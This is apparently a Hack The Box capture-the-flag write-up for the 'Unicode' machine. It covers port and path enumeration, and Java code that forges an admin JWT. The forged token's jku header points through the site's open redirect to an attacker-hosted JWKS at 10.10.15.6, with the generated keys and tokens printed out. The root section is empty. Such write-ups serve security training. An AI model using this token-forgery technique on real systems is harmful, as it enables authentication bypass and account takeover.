# Unicode

# Enumeration

````
nmap -sCV -p22,80 --min-rate 1000 10.10.11.126 -oA nmap-10.10.11.126-sCV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 06:18 EDT
Nmap scan report for unicode.htb (10.10.11.126)
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)
|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)
|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-generator: Hugo 0.83.1
|_http-title: Hackmedia
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds
````

````
# wfuzz -u 'http://unicode.htb/FUZZ' -w /root/Downloads/subdomains-top1million-110000.txt --hl 514
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://unicode.htb/FUZZ
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                 
=====================================================================

000000107:   308        3 L      24 W       258 Ch      "upload"                                                                                             
000000468:   308        3 L      24 W       262 Ch      "register"                                                                                          
000002707:   308        3 L      24 W       256 Ch      "debug"                                                                                              
000009283:   308        3 L      24 W       258 Ch      "logout"                                                                                             
000025933:   308        3 L      24 W       260 Ch      "pricing"                                                                                             
000047706:   200        68 L     162 W      2078 Ch     "#smtp"
````

Create a user and login
````
POST /login/ HTTP/1.1
Host: unicode.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://unicode.htb
Connection: close
Referer: http://unicode.htb/login/
Upgrade-Insecure-Requests: 1

username=blah&password=bugsam
````

````
HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 23 Mar 2022 10:22:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 228
Connection: close
Location: http://unicode.htb/dashboard/
Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYmxhaCJ9.g1K_hychzS7mTBSAnra1_WY1iMWs9SpzFsBsvEapubKQXIg6bG5zBnTyicFZ7v3nMf7VD0mBUoor2G8Sc5255OT-yGCDATs-xCo5z_9Q0rX2aVcjslpY0YjOdkvBztXI76tBEOtfYwjs2VQ2GWzdvA_r1H8vkIR2Qw3lpQ4MJVAHldqoL23uCu1KMQYhYeh6EuRMiI697PGCo4BCojLYVugfzgJhkWWyEH7jRDOu4C05JW3RMsJryAvM2om_ndv8SVj8NFNZBf1HMjiltUNtFgRI1708xRfxK-yUS3F1P0eWoEIDWdM01S6CzIuKWYnYAQlJHiDS3mPzx6wfsLfiqA; Path=/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/dashboard/">/dashboard/</a>. If not click the link.
````


# User

[pyjwt](https://pyjwt.readthedocs.io/en/stable/usage.html)
````python
>>> import jwt
>>> payload =
'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYmxhaCJ9.g1K_hychzS7mTBSAnra1_WY1iMWs9SpzFsBsvEapubKQXIg6bG5zBnTyicFZ7v3nMf7VD0mBUoor2G8Sc5255OT-yGCDATs-xCo5z_9Q0rX2aVcjslpY0YjOdkvBztXI76tBEOtfYwjs2VQ2GWzdvA_r1H8vkIR2Qw3lpQ4MJVAHldqoL23uCu1KMQYhYeh6EuRMiI697PGCo4BCojLYVugfzgJhkWWyEH7jRDOu4C05JW3RMsJryAvM2om_ndv8SVj8NFNZBf1HMjiltUNtFgRI1708xRfxK-yUS3F1P0eWoEIDWdM01S6CzIuKWYnYAQlJHiDS3mPzx6wfsLfiqA'
>>> jwt.get_unverified_header(payload)
{'typ': 'JWT', 'alg': 'RS256', 'jku': 'http://hackmedia.htb/static/jwks.json'}
>>> jwt.decode(payload, options={"verify_signature": False})
{'user': 'blah'}
````


````json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}
````

Generating a JWK
````java
package com.company;
import java.security.*;
import java.security.interfaces.*;
import java.util.*;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonParser;
import com.nimbusds.jose.jwk.JWK;
import com.nimbusds.jose.jwk.KeyUse;
import com.nimbusds.jose.jwk.RSAKey;

public class Main {

    public static void main(String[] args) throws NoSuchAlgorithmException {
        // write your code here
        // Generate the RSA key pair
        KeyPairGenerator gen = KeyPairGenerator.getInstance("RSA");
        gen.initialize(2048);
        KeyPair keyPair = gen.generateKeyPair();

        // Convert to JWK format
        JWK jwk = new RSAKey.Builder((RSAPublicKey)keyPair.getPublic())
        .privateKey((RSAPrivateKey)keyPair.getPrivate())
        .keyUse(KeyUse.SIGNATURE)
        .keyID(UUID.randomUUID().toString())
        .build();

        //Printing on screen
        Gson gson = new GsonBuilder().setPrettyPrinting().create();
        System.out.println(gson.toJson(JsonParser.parseString(jwk.toJSONString())));
    }
}
````

new JWK
````json
{
  "p": "y2wRyFxKRSh1bQUdViGOX2GWXmRRcmMWUnoIBst8OVhTr79iO2qilGmno5Ca9_9bSQ6PCNpCKZYXugFEUuUIiGlW1IdRdpb_v3YIvPl7IpqCL3UQVkUSSJEXQIi5bkZooOpgduzg7maHzoXAZwb_ZxImFm6ldv4NdJcS85yarsU",
  "kty": "RSA",
  "q": "veNZ9gbHv5wG-xnKmjAYrVH2OheotK1BVkNvNh0BwQ3F72QjOilFcQjamaiWK8ueoWrvv5N8-lR1GDsxf-PDkauLzNT3kBpu33D6vedmnEa8RKEKLpP6tTORXt9SStT0tE1HboRwwqMn8hvs-HPwDTSwVNQMLZldll51bZeWwgM",
  "d": "A-JQ7j0hn7emmxpXCGuAEbQF0iGuJFrc_GZ_vKMF_ynKc0qEI9gwHRCaP-tj8U2u--IIxWNkTwydbZLK-DwT_EZ3UL3l71v1fED6JGlG93R_cA4sekRaKFumPbP7j_8jQPdkx7i63FJVE3qWdF15TbQsVnpLYloAla8LW9RfRYrF7Cy0uzncVnqh_vITzST0lNlchAAisr3xpY2wZs71aUGcwj4sIjMuk3qn4fBvewaemg-b0NmylTFwHeQknfhuMgaMyOopW_zCzw8sV2tEH3tSEwSikHFM8qU0kSTiisFKezqPi6UxRMPsFxw1i8X6EAUVGWkRTz24x4bVFmqTOQ",
  "e": "AQAB",
  "use": "sig",
  "kid": "d763bd50-698a-44d6-802e-920b37ea1fd3",
  "qi": "SqRQjiUx9yp-3qZ0KNQz-F-tS76NlajEhxgD_-heqapDIPD4UuY1cTJFqQVgk2pVu9r8QmgA249T7c1M8qzilxvbssJBcLRV2L7QHIPnabHP7TEpU_KHlchNQEEd_RBcTLi3_wep5dBiOB-aMxkjx-3uJynWUDjufI209Mb0ArU",
  "dp": "YGFMr5yih8_aixPQSX3OofxvrTtkp4ixC9TLtsR0kAr8Y5mO5k3ox96jUcjy06uGSb__HxeiH2gAx91PzOK9PzyBqmKOw1xZwhIfo8GkiMmiAvA5FFbXidBMrwPYr5nmes9xcwdarzmfAMe4WFglbGVZ7GjyNsW6BFKL5SZ-120",
  "dq": "HKNZQf2ryn4hn2U4ZSCz2A_wbrp6uyUWIYhyEVs2lIMbQwt7NJ5c1rtbHKmMXHaNKhMSrXX091wdfNYQlRUovaN9phrIa3dRGWnUpydrFk6kvkT7YCL5QLLSTdiodJjBfx_YkhZvWyt4Ls9_Yck6fwNfRKvmWkozDyaX1ztxhTk",
  "n": "luNxcMI3qzbUkABS-Fd7QDQhGsinO3x8Unkdw2p40fzoCUBoJ4EhugAzERfNuYgpg2rHT2OnJGh5uyO-TAiIBTpcckyVgvFolk0l_wBcX9LqFJQwBPtcOB4jG4AdvVY7MqFsEALR4FBV3HCWYDKiPwxMRs-SO2RyrKI5zA-lPcZF7QgH0rIMGl8KH9PemRbYxg3KAl-gcbX0PBM6jkGdj67K-N6XxxfwmzZrcf6E-2Y1PPq-LfA4iZX5Ij9FXy_6SJfKGYH5NcZzx0ufFaF8hwVUHmfY7asFWPC8SqzVIDH3-IjnwAlyNR2YugChfPzIfyiIeJcLX0agUUghqK9WTw"
}
````

jwks.json
````json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "luNxcMI3qzbUkABS-Fd7QDQhGsinO3x8Unkdw2p40fzoCUBoJ4EhugAzERfNuYgpg2rHT2OnJGh5uyO-TAiIBTpcckyVgvFolk0l_wBcX9LqFJQwBPtcOB4jG4AdvVY7MqFsEALR4FBV3HCWYDKiPwxMRs-SO2RyrKI5zA-lPcZF7QgH0rIMGl8KH9PemRbYxg3KAl-gcbX0PBM6jkGdj67K-N6XxxfwmzZrcf6E-2Y1PPq-LfA4iZX5Ij9FXy_6SJfKGYH5NcZzx0ufFaF8hwVUHmfY7asFWPC8SqzVIDH3-IjnwAlyNR2YugChfPzIfyiIeJcLX0agUUghqK9WTw",
            "e": "AQAB"
        }
    ]
}
````

Using the function http://hackmedia.htb/redirect/?url=google.com it is possible to redirect the server to retrieve our JWT

JWK and JWT
````java
package com.company;
import java.net.URI;
import java.net.URISyntaxException;
import java.security.*;
import java.security.interfaces.*;
import java.util.*;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.JsonParser;
import com.nimbusds.jose.jwk.JWK;
import com.nimbusds.jose.jwk.KeyUse;
import com.nimbusds.jose.jwk.RSAKey;
import com.nimbusds.jwt.JWTClaimsSet;

import com.nimbusds.jose.*;
import com.nimbusds.jose.crypto.*;
import com.nimbusds.jose.jwk.gen.*;
import com.nimbusds.jwt.*;

public class Main {

    public static void main(String[] args) throws URISyntaxException, JOSEException, NoSuchAlgorithmException {
        jwkGen();

        jwtGen();
    }

    public static void jwtGen()throws JOSEException, URISyntaxException  {
        //JWT
        //header
        RSAKey rsaJWK = new RSAKeyGenerator(2048)
                .keyID("1337")
                .generate();
        RSAKey rsaPublicJWK = rsaJWK.toPublicJWK();

        JWSSigner signer = new RSASSASigner(rsaJWK);

        // payload
        JWTClaimsSet payload = new JWTClaimsSet.Builder()
                .claim("user","admin")
                .build();

        //signature
        SignedJWT signedJWT = new SignedJWT(
                new JWSHeader.Builder(JWSAlgorithm.RS256)
                        .jwkURL(new URI("http://hackmedia.htb/static/../redirect?url=10.10.15.6/jwks.json"))
                        .type(JOSEObjectType.JWT)
                        .build(),
                payload
        );

        signedJWT.sign(signer);

        String serialized = signedJWT.serialize();

        //System.out.println(payload.toJSONObject());
        System.out.println(serialized);
    }

    public static void jwkGen() throws NoSuchAlgorithmException {
        //JWK
        // Generate the RSA key pair
        KeyPairGenerator gen = KeyPairGenerator.getInstance("RSA");
        gen.initialize(2048);
        KeyPair keyPair = gen.generateKeyPair();

        // Convert to JWK format
        JWK jwk = new RSAKey.Builder((RSAPublicKey) keyPair.getPublic())
                .privateKey((RSAPrivateKey) keyPair.getPrivate())
                .keyUse(KeyUse.SIGNATURE)
                .keyID(UUID.randomUUID().toString())
                .build();

        //Printing on screen
        Gson gson = new GsonBuilder().setPrettyPrinting().create();
        System.out.println(gson.toJson(JsonParser.parseString(jwk.toJSONString())));
    }
}
````

````
>>> payload = "eyJqa3UiOiJodHRwOlwvXC9oYWNrbWVkaWEuaHRiXC9zdGF0aWNcLy4uXC9yZWRpcmVjdD91cmw9MTAuMTAuMTUuNlwvandrcy5qc29uIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJ1c2VyIjoiYWRtaW4ifQ.XuHzSnUdJHFFGhKbH-j4uToX_F0cgTER03mtFbkSv_HuA2OqpdwqoKV8TDrSkTYX-SeKFeoGAl3JtvlGoqGTMUcYTZ0aVYCSQd88yZ39dI87Gf_mH24JTmK6-21IKpFUEbNpI3gcyRuUoucQUmcXQAUAhEWxVGE_Cc2juglSq0mnn_UcjLzo6HtcPJSrx2csA7_f5qVmv-_LkSOAuXyGY4Q93mMH_ttmvUv_kbY4rUgn5-H1DNhLm1JeVC18DJ-uA5RsKc9WReVbH3zIfkE8RAScSZulxW2n44RGQgBjwkvlorPdmBlAaMQDOOrGSCjtqYAz6sTYjlvYG9Qpq-bDWQ"
>>> 
>>> jwt.get_unverified_header(payload);
{'jku': 'http://hackmedia.htb/static/../redirect?url=10.10.15.6/jwks.json', 'typ': 'JWT', 'alg': 'RS256'}
>>> jwt.decode(payload, options={"verify_signature": False})
{'user': 'admin'}
````



````
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTUuNi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.rhyqiURChTIPRQ0Lih_NnK56GzVgosn-N3l5u8R0s3CKo61Y3H-GcLRxrvXEHoWuKuwFQmU2rGzsZjmM_Jj8OsbwZc8-nQZJvIDl1fH7I4nMpph-MrXVJHiN9saRvByji6DQgQMcHYgfoH6SfeblGc9ta_MDFkW7ju1njpIB3OU8W8giNP2ZUC_y2RE8SezWi5FcrzNH8WYKRiHbUNovEGK-ACeUZDo4nxbUGPQabEAtDE6nlE7nSfQLcK0RdSTMQ4mSeDajdOHDPyCo1XrzS_I42h8bRJ_y0H50805Yee2v4fslsNlPvq19__TeYpuHEZRbTZ0MU7UL07Oxiy7ykg
````


# Root

# Secrets


https://connect2id.com/products/nimbus-jose-jwt/examples
